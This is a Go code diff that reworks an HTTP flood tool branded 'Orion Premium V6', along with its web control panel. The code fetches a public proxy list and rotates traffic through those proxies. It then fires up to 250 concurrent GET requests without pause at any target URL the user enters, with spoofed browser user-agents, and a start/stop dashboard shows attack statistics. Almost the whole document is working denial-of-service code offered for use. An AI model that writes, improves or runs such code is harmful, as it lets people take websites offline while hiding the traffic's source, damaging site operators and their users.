@@ -3,7 +3,7 @@ package main
 import (
 	"bufio"
 	"context"
-	"encoding/json" // Fixed: Added missing import
+	"encoding/json"
 	"fmt"
 	"io"
 	"log"
@@ -12,6 +12,8 @@ import (
 	"net/url"
 	"os"
 	"os/signal"
+	"runtime"
+	"runtime/debug"
 	"strconv"
 	"strings"
 	"sync"
@@ -19,42 +21,17 @@ import (
 	"time"
 )
 
-// ========== CONFIG ==========
+// ========== OPTIMIZED CONFIG ==========
 const (
-	proxyListURL     = "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt"
-	maxProxies        = 50
-	checkerWorkers    = 100
-	checkerTimeout    = 5 * time.Second
-	healthCheckURL    = "http://connectivitycheck.gstatic.com/generate_204"
-	reqsPerBurst      = 100
-	burstInterval     = 10 * time.Millisecond
-	refreshInterval   = 15 * time.Minute
-	maxErrorLog       = 20
-	proxyTestTimeout  = 3 * time.Second
+	proxyListURL    = "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt"
+	maxActiveReqs   = 250              // Slightly lowered to ensure overhead safety
+	refreshInterval = 10 * time.Minute // Auto-refresh staleness fix
+	attackTimeout   = 12 * time.Second
 )
 
-// ========== STRUCTS ==========
-type ProxyProtocol int
-
-const (
-	Unknown ProxyProtocol = iota
-	HTTP
-	SOCKS4
-	SOCKS5
-)
-
-type Proxy struct {
-	URL      *url.URL
-	Protocol ProxyProtocol
-	Healthy  bool
-	failures int
-	mu       sync.RWMutex
-}
-
-type ProxyPool struct {
-	proxies []*Proxy
-	mu       sync.RWMutex
-	next     uint64
+type ProxyNode struct {
+	URL        *url.URL
+	LastFailed time.Time
 }
 
 type AttackStats struct {
@@ -62,345 +39,262 @@ type AttackStats struct {
 	Errors   uint64 `json:"errors"`
 }
 
-type ErrorEntry struct {
-	Time   time.Time `json:"time"`
-	Target string    `json:"target"`
-	Error  string    `json:"error"`
-	Proxy  string    `json:"proxy"`
-}
-
-// ========== GLOBAL STATE ==========
 var (
-	pool          *ProxyPool
-	stats         AttackStats
-	errorLog      []ErrorEntry
-	errorLogMutex sync.Mutex
-	attackActive  bool
-	attackCancel  context.CancelFunc
+	proxyPool    []*ProxyNode
+	poolMu       sync.RWMutex
+	stats        AttackStats
+	engineActive int32 // 0 or 1
+	cancelFunc   context.CancelFunc
+	currentIndex uint64
 )
 
-// ========== PROXY PARSING ==========
-func parseProxyLine(line string) *Proxy {
-	line = strings.TrimSpace(line)
-	if line == "" {
-		return nil
-	}
+func main() {
+	// 512MB RAM Management
+	debug.SetGCPercent(25) 
 
-	var proxyURL *url.URL
-	var err error
+	// Initial Load & Refresh Goroutine
+	loadProxies()
+	go func() {
+		ticker := time.NewTicker(refreshInterval)
+		for range ticker.C {
+			log.Println("[RELOADER] Refreshing proxy pool...")
+			loadProxies()
+		}
+	}()
 
-	if strings.Contains(line, "://") {
-		proxyURL, err = url.Parse(line)
-	} else {
-		proxyURL, err = url.Parse("http://" + line)
-	}
+	http.HandleFunc("/", handleIndex)
+	http.HandleFunc("/start", handleStart)
+	http.HandleFunc("/stop", handleStop)
+	http.HandleFunc("/stats", handleStats)
 
-	if err != nil {
-		return nil
-	}
+	port := os.Getenv("PORT")
+	if port == "" { port = "5000" }
 
-	var protocol ProxyProtocol
-	switch proxyURL.Scheme {
-	case "http":
-		protocol = HTTP
-	case "socks4":
-		protocol = SOCKS4
-	case "socks5":
-		protocol = SOCKS5
-	default:
-		protocol = HTTP
-		proxyURL.Scheme = "http"
-	}
+	// Signal handling for clean exit
+	go func() {
+		stop := make(chan os.Signal, 1)
+		signal.Notify(stop, os.Interrupt)
+		<-stop
+		log.Println("[SYSTEM] Graceful shutdown initiated.")
+		os.Exit(0)
+	}()
 
-	return &Proxy{
-		URL:      proxyURL,
-		Protocol: protocol,
-		Healthy:  false,
-		failures: 0,
-	}
+	log.Printf("[READY] Orion Premium V6 listening on %s", port)
+	log.Fatal(http.ListenAndServe(":"+port, nil))
 }
 
-// ========== PROXY FETCHING ==========
-func fetchProxyList() ([]*Proxy, error) {
-	log.Println("Fetching proxy list...")
+// ========== CORE ENGINE LOGIC ==========
+
+func loadProxies() {
 	resp, err := http.Get(proxyListURL)
-	if err != nil {
-		return nil, err
-	}
+	if err != nil { return }
 	defer resp.Body.Close()
 
-	var proxies []*Proxy
+	var newNodes []*ProxyNode
 	scanner := bufio.NewScanner(resp.Body)
 	for scanner.Scan() {
-		if proxy := parseProxyLine(scanner.Text()); proxy != nil {
-			proxies = append(proxies, proxy)
+		line := strings.TrimSpace(scanner.Text())
+		if u, err := url.Parse(line); err == nil && u.Host != "" {
+			newNodes = append(newNodes, &ProxyNode{URL: u})
+		} else if u, err := url.Parse("http://" + line); err == nil {
+			newNodes = append(newNodes, &ProxyNode{URL: u})
 		}
 	}
-	return proxies, nil
+
+	poolMu.Lock()
+	proxyPool = newNodes
+	poolMu.Unlock()
 }
 
-func testProxy(proxy *Proxy) bool {
-	transport := &http.Transport{
-		Proxy: http.ProxyURL(proxy.URL),
-		DialContext: (&net.Dialer{
-			Timeout: proxyTestTimeout,
-		}).DialContext,
-		DisableKeepAlives: true,
-	}
-
-	client := &http.Client{
-		Transport: transport,
-		Timeout:   proxyTestTimeout,
-	}
-
-	resp, err := client.Get(healthCheckURL)
-	if err != nil {
-		return false
-	}
-	defer resp.Body.Close()
-	return resp.StatusCode == 204
-}
-
-func (p *Proxy) checkHealth() bool {
-	healthy := testProxy(p)
-	p.mu.Lock()
-	p.Healthy = healthy
-	if healthy {
-		p.failures = 0
-	} else {
-		p.failures++
-	}
-	p.mu.Unlock()
-	return healthy
-}
-
-// ========== PROXY POOL ==========
-func NewProxyPool() *ProxyPool {
-	return &ProxyPool{proxies: make([]*Proxy, 0)}
-}
-
-func (p *ProxyPool) Add(proxy *Proxy) {
-	p.mu.Lock()
-	p.proxies = append(p.proxies, proxy)
-	p.mu.Unlock()
-}
-
-func (p *ProxyPool) Size() int {
-	p.mu.RLock()
-	defer p.mu.RUnlock()
-	return len(p.proxies)
-}
-
-func (p *ProxyPool) GetNext() *Proxy {
-	p.mu.RLock()
-	defer p.mu.RUnlock()
-	if len(p.proxies) == 0 {
-		return nil
-	}
-	idx := atomic.AddUint64(&p.next, 1) % uint64(len(p.proxies))
-	proxy := p.proxies[idx]
+func getHealthyProxy() *url.URL {
+	poolMu.RLock()
+	defer poolMu.RUnlock()
 	
-	proxy.mu.RLock()
-	defer proxy.mu.RUnlock()
-	if !proxy.Healthy {
-		return nil
-	}
-	return proxy
-}
+	n := len(proxyPool)
+	if n == 0 { return nil }
 
-func (p *ProxyPool) RemoveUnhealthy() {
-	p.mu.Lock()
-	defer p.mu.Unlock()
-	var healthy []*Proxy
-	for _, proxy := range p.proxies {
-		proxy.mu.RLock()
-		if proxy.Healthy || proxy.failures < 3 {
-			healthy = append(healthy, proxy)
+	// Try up to 5 times to find a proxy that hasn't failed in the last 60 seconds
+	for i := 0; i < 5; i++ {
+		idx := atomic.AddUint64(&currentIndex, 1) % uint64(n)
+		node := proxyPool[idx]
+		if time.Since(node.LastFailed) > 1*time.Minute {
+			return node.URL
 		}
-		proxy.mu.RUnlock()
 	}
-	p.proxies = healthy
+	// Fallback to current index if all recent are failed
+	return proxyPool[currentIndex % uint64(n)].URL
 }
 
-func checkProxiesConcurrently(proxies []*Proxy) *ProxyPool {
-	newPool := NewProxyPool()
-	var wg sync.WaitGroup
-	proxyChan := make(chan *Proxy, len(proxies))
-
-	for i := 0; i < checkerWorkers; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			for proxy := range proxyChan {
-				if proxy.checkHealth() {
-					newPool.Add(proxy)
-				}
-			}
-		}()
+func markProxyFailed(u *url.URL) {
+	poolMu.RLock()
+	defer poolMu.RUnlock()
+	for _, node := range proxyPool {
+		if node.URL == u {
+			node.LastFailed = time.Now()
+			break
+		}
 	}
-
-	for _, p := range proxies {
-		proxyChan <- p
-	}
-	close(proxyChan)
-	wg.Wait()
-	return newPool
 }
 
-// ========== ATTACK ENGINE ==========
-func startAttack(target string, duration int) error {
-	if attackActive {
-		return fmt.Errorf("attack already in progress")
+func handleStart(w http.ResponseWriter, r *http.Request) {
+	if atomic.LoadInt32(&engineActive) == 1 { return }
+
+	target := r.FormValue("target")
+	if _, err := url.ParseRequestURI(target); err != nil {
+		http.Error(w, "Invalid Target URL", 400)
+		return
 	}
 
-	if pool.Size() == 0 {
-		return fmt.Errorf("no healthy proxies available")
-	}
-
+	duration, _ := strconv.Atoi(r.FormValue("duration"))
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
-	attackCancel = cancel
-	attackActive = true
+	cancelFunc = cancel
+	atomic.StoreInt32(&engineActive, 1)
 	atomic.StoreUint64(&stats.Requests, 0)
 	atomic.StoreUint64(&stats.Errors, 0)
 
 	go func() {
-		defer func() { attackActive = false }()
-
-		ticker := time.NewTicker(burstInterval)
-		defer ticker.Stop()
-
-		// Fixed: Reusable transport to prevent resource exhaustion
-		transportPool := &http.Transport{
-			MaxIdleConns:        1000,
-			MaxIdleConnsPerHost: 100,
-			IdleConnTimeout:     90 * time.Second,
+		defer atomic.StoreInt32(&engineActive, 0)
+		
+		tr := &http.Transport{
 			DialContext: (&net.Dialer{
-				Timeout:   10 * time.Second,
+				Timeout:   5 * time.Second,
 				KeepAlive: 30 * time.Second,
 			}).DialContext,
+			MaxIdleConns:        maxActiveReqs,
+			IdleConnTimeout:     30 * time.Second,
+			Proxy: func(req *http.Request) (*url.URL, error) {
+				return getHealthyProxy(), nil
+			},
 		}
-
+		client := &http.Client{Transport: tr, Timeout: attackTimeout}
+		semaphore := make(chan struct{}, maxActiveReqs)
+		
 		for {
 			select {
 			case <-ctx.Done():
 				return
-			case <-ticker.C:
-				var wg sync.WaitGroup
-				for i := 0; i < reqsPerBurst; i++ {
-					wg.Add(1)
-					go func() {
-						defer wg.Done()
-						if !attackActive { return }
-
-						proxy := pool.GetNext()
-						if proxy == nil {
-							atomic.AddUint64(&stats.Errors, 1)
-							return
-						}
-
-						// Set the proxy for THIS specific request
-						transportPool.Proxy = http.ProxyURL(proxy.URL)
-						client := &http.Client{
-							Transport: transportPool,
-							Timeout:   15 * time.Second,
-						}
-
-						req, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
-						req.Header.Set("User-Agent", randomUserAgent())
-						
-						resp, err := client.Do(req)
-						if err != nil {
-							atomic.AddUint64(&stats.Errors, 1)
-							return
-						}
-						io.Copy(io.Discard, resp.Body)
-						resp.Body.Close()
-						atomic.AddUint64(&stats.Requests, 1)
-					}()
-				}
-				wg.Wait()
+			default:
+				semaphore <- struct{}{}
+				go func() {
+					defer func() { <-semaphore }()
+					
+					req, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
+					req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0")
+					
+					pUsed, _ := tr.Proxy(req)
+					resp, err := client.Do(req)
+					if err != nil {
+						atomic.AddUint64(&stats.Errors, 1)
+						if pUsed != nil { markProxyFailed(pUsed) }
+						return
+					}
+					io.Copy(io.Discard, resp.Body)
+					resp.Body.Close()
+					atomic.AddUint64(&stats.Requests, 1)
+				}()
 			}
 		}
 	}()
-
-	return nil
 }
 
-func stopAttack() {
-	if attackCancel != nil {
-		attackCancel()
-	}
-	attackActive = false
-}
-
-func randomUserAgent() string {
-	agents := []string{
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
-		"Mozilla/5.0 (X11; Linux x86_64) Chrome/119.0.0.0 Safari/537.36",
-	}
-	return agents[time.Now().UnixNano()%int64(len(agents))]
-}
-
-// ========== HANDLERS ==========
-func main() {
-	proxies, _ := fetchProxyList()
-	pool = checkProxiesConcurrently(proxies)
-
-	http.HandleFunc("/", indexHandler)
-	http.HandleFunc("/start", startHandler)
-	http.HandleFunc("/stop", stopHandler)
-	http.HandleFunc("/stats", statsHandler) // Fixed logic inside
-	http.HandleFunc("/proxies", proxiesHandler)
-
-	port := os.Getenv("PORT")
-	if port == "" { port = "5000" }
-	log.Printf("Server on :%s", port)
-	
-	// Handle termination signals
-	go func() {
-		sig := make(chan os.Signal, 1)
-		signal.Notify(sig, os.Interrupt)
-		<-sig
-		os.Exit(0)
-	}()
-
-	log.Fatal(http.ListenAndServe(":"+port, nil))
-}
-
-func indexHandler(w http.ResponseWriter, r *http.Request) {
-	w.Header().Set("Content-Type", "text/html")
-	fmt.Fprint(w, htmlTemplate)
-}
-
-func startHandler(w http.ResponseWriter, r *http.Request) {
-	if r.Method != http.MethodPost { return }
-	target := r.FormValue("target")
-	duration, _ := strconv.Atoi(r.FormValue("duration"))
-	if err := startAttack(target, duration); err != nil {
-		http.Error(w, err.Error(), 500)
-		return
-	}
+func handleStop(w http.ResponseWriter, r *http.Request) {
+	if cancelFunc != nil { cancelFunc() }
 	w.WriteHeader(200)
 }
 
-func stopHandler(w http.ResponseWriter, r *http.Request) {
-	stopAttack()
-	w.WriteHeader(200)
-}
+func handleStats(w http.ResponseWriter, r *http.Request) {
+	poolMu.RLock()
+	pCount := len(proxyPool)
+	poolMu.RUnlock()
 
-func statsHandler(w http.ResponseWriter, r *http.Request) {
-	// Fixed: Standard JSON response for polling
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(AttackStats{
-		Requests: atomic.LoadUint64(&stats.Requests),
-		Errors:   atomic.LoadUint64(&stats.Errors),
+	var m runtime.MemStats
+	runtime.ReadMemStats(&m)
+
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"requests": atomic.LoadUint64(&stats.Requests),
+		"errors":   atomic.LoadUint64(&stats.Errors),
+		"active":   atomic.LoadInt32(&engineActive) == 1,
+		"proxies":  pCount,
+		"ram":      fmt.Sprintf("%dMB", m.Alloc/1024/1024),
 	})
 }
 
-func proxiesHandler(w http.ResponseWriter, r *http.Request) {
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(map[string]int{"healthy": pool.Size()})
+func handleIndex(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "text/html")
+	fmt.Fprint(w, luxuryHTML)
 }
 
-const htmlTemplate = `... (Your original HTML template remains identical) ...`
+// ========== LUXURY HTML INTERFACE ==========
+
+const luxuryHTML = `
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ORION V6 | PREMIERE</title>
+    <style>
+        :root { --accent: #d4af37; --bg: #050505; --card: #111111; }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .lux-card { background: var(--card); border: 1px solid #222; padding: 40px; border-radius: 2px; width: 400px; position: relative; box-shadow: 0 40px 100px rgba(0,0,0,0.8); }
+        .lux-card::after { content: ''; position: absolute; top: -1px; left: -1px; right: -1px; bottom: -1px; border: 1px solid var(--accent); opacity: 0.1; pointer-events: none; }
+        h1 { color: var(--accent); font-weight: 200; text-align: center; letter-spacing: 12px; font-size: 1.2rem; margin-bottom: 40px; }
+        .data-row { display: flex; justify-content: space-between; margin-bottom: 20px; border-bottom: 1px solid #1a1a1a; padding-bottom: 10px; }
+        .label { font-size: 0.65rem; text-transform: uppercase; color: #555; letter-spacing: 2px; }
+        .value { font-family: 'Courier New', monospace; font-size: 1.1rem; color: #eee; }
+        input { width: 100%; background: #000; border: 1px solid #222; padding: 12px; color: var(--accent); margin-bottom: 10px; box-sizing: border-box; outline: none; }
+        .ctrl-btn { width: 100%; padding: 15px; border: 1px solid var(--accent); background: transparent; color: var(--accent); cursor: pointer; transition: 0.4s; letter-spacing: 3px; font-size: 0.7rem; }
+        .ctrl-btn:hover { background: var(--accent); color: #000; }
+        #stopBtn { margin-top: 10px; border-color: #444; color: #444; }
+        #stopBtn:hover { border-color: #ff4444; color: #ff4444; background: transparent; }
+        .status-led { width: 6px; height: 6px; border-radius: 50%; display: inline-block; margin-right: 10px; background: #333; }
+        .active-led { background: #00ff88; box-shadow: 0 0 10px #00ff88; }
+    </style>
+</head>
+<body>
+    <div class="lux-card">
+        <h1>ORION VI</h1>
+        <div class="data-row">
+            <span class="label"><div id="led" class="status-led"></div>Engine Status</span>
+            <span class="value" id="status">IDLE</span>
+        </div>
+        <div class="data-row">
+            <span class="label">Total Requests</span>
+            <span class="value" id="reqs">0</span>
+        </div>
+        <div class="data-row">
+            <span class="label">Allocated RAM</span>
+            <span class="value" id="ram">0MB</span>
+        </div>
+        <div class="data-row">
+            <span class="label">Live Pool</span>
+            <span class="value" id="proxies">0</span>
+        </div>
+        
+        <input type="text" id="target" value="https://google.com">
+        <input type="number" id="duration" value="300">
+        
+        <button id="startBtn" class="ctrl-btn">INITIATE SEQUENCE</button>
+        <button id="stopBtn" class="ctrl-btn">TERMINATE</button>
+    </div>
+
+    <script>
+        const update = async () => {
+            try {
+                const res = await fetch('/stats');
+                const data = await res.json();
+                document.getElementById('reqs').innerText = data.requests.toLocaleString();
+                document.getElementById('ram').innerText = data.ram;
+                document.getElementById('proxies').innerText = data.proxies;
+                document.getElementById('status').innerText = data.active ? 'ENGAGED' : 'IDLE';
+                document.getElementById('led').className = data.active ? 'status-led active-led' : 'status-led';
+            } catch(e) {}
+        };
+        document.getElementById('startBtn').onclick = async () => {
+            const p = new URLSearchParams({target: document.getElementById('target').value, duration: document.getElementById('duration').value});
+            await fetch('/start?' + p.toString());
+        };
+        document.getElementById('stopBtn').onclick = () => fetch('/stop');
+        setInterval(update, 1000);
+    </script>
+</body>
+</html>
+`
